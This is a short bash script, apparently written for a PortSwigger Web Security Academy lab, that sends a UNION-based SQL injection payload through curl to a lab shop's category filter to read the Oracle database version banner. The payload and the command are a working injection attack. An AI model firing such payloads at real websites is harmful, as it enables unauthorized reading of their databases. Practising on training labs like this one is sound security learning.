#!/bin/bash
url="https://0ab400850365040981ef61ee007a0094.web-security-academy.net/filter?category=Gifts"
# Test for SQL injection with Oracle version detection
payload="' UNION SELECT banner, NULL FROM v$version--"
curl -s "${url}${payload}" | grep -A 10 -B 10 "Oracle\|11g\|Production"